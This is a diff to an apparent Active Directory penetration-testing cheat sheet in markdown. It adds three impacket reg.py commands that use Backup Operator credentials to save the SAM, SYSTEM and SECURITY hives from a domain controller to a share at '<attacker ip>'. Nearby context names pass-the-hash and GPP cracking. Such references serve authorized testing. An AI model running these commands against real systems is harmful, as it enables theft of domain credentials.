@@ -518,6 +518,12 @@ reg.py <domain>/<valid username with domain> -hashes '<LMHASH:NTHASH>' query -ke
 # Registry Root Keys: HKCR, HKCU, HKLM, HKU, HKCC
 ```
 
+```
+reg.py "<domain>"/"<backup_operator>":"<password>"@"<dc ip>" save -keyName 'HKLM\SAM' -o '\\<attacker ip>\share'
+reg.py "<domain>"/"<backup_operator>":"<password>"@"<dc ip>" save -keyName 'HKLM\SYSTEM' -o '\\<attacker ip>\share'
+reg.py "<domain>"/"<backup_operator>":"<password>"@"<dc ip>" save -keyName 'HKLM\SECURITY' -o '\\<attacker ip>\share'
+```
+
 ### :open_file_folder: Group Policy Preferences File (GPP cracking)
 
 Groups.xml
